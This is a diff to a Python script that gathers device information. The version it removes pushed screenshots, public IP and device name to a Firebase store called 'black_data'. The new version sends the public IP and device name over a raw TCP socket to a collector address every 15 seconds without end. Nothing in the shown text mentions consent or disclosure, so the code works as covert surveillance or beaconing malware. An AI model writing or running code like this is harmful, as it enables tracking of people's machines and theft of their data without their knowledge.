@@ -1,3 +1,4 @@
+import socket
 import requests
 import time
 import platform
@@ -7,20 +8,15 @@ import mss
 import base64
 from io import BytesIO
 from PIL import Image
-import firebase_admin
-from firebase_admin import credentials, db
 
-# Initialize Firebase
-cred = credentials.Certificate("path/to/your/firebase_credentials.json")
-firebase_admin.initialize_app(cred, {
-    'databaseURL': 'https://your-database-name.firebaseio.com/'
-})
+ZAMASOU_IP = "127.0.0.1"
+ZAMASOU_PORT = 2024
 
 def capture_screen():
     try:
         with mss.mss() as sct:
-            screenshot = sct.shot(output='screenshot.png')
-            img = Image.open(screenshot)
+            screenshot = sct.shot()
+            img = Image.open(BytesIO(screenshot))
             buffered = BytesIO()
             img.save(buffered, format="PNG")
             return base64.b64encode(buffered.getvalue()).decode('utf-8')
@@ -28,11 +24,21 @@ def capture_screen():
         print(f"Error occurred while capturing screen: {e}")
         return None
 
+def send_data(ip, port, data):
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.connect((ip, port))
+            s.sendall(data.encode())
+            print("Data sent successfully!")
+    except Exception as e:
+        print(f"Error occurred while sending data: {e}")
+
 def get_ip_info():
     try:
         response = requests.get("http://ipinfo.io/json")
         data = response.json()
-        return data
+        ip_address = data.get("ip")
+        return ip_address
     except Exception as e:
         print(f"Error occurred: {e}")
         return None
@@ -75,25 +81,17 @@ def fetch_device_name_from_google(query):
         print(f"Error occurred while searching on Google: {e}")
         return query
 
-def send_data_to_firebase(data):
-    ref = db.reference('black_data')
-    ref.push(data)
-
 def main():
     device_name = get_device_name()
 
     while True:
-        ip_info = get_ip_info()
-        screenshot = capture_screen()
-
-        data = {
-            "device_name": device_name,
-            "ip_info": ip_info,
-            "screenshot": screenshot,
-            "timestamp": time.time()
-        }
-
-        send_data_to_firebase(data)
+        ip = get_ip_info()
+        if ip:
+            data = f"Public IP address: {ip}, Device Name: {device_name}"
+            send_data(ZAMASOU_IP, ZAMASOU_PORT, data)
+        else:
+            data = f"Failed to retrieve IP information, Device Name: {device_name}"
+            send_data(ZAMASOU_IP, ZAMASOU_PORT, data)
         time.sleep(15)
 
 if __name__ == "__main__":
